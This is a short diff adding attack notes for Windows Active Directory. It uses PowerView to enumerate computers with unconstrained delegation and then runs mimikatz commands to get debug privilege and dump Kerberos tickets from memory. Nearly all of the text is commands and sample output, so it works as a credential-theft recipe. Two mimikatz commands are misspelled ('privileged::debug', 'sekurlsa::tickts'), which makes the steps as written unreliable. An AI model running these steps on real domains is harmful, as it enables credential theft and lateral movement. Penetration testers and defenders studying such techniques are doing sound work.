@@ -1,0 +1,10 @@
+# In windows machine
+
+    ps> Import-Module .\Powerview.ps1
+    ps> Get-DomainComputer -Unconstrained
+        useraccountcontrol                       : WORKSTATION_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
+        name                                     : APPSRV01
+
+    mimikatz> privileged::debug
+    mimikatz> sekurlsa::tickts
+            
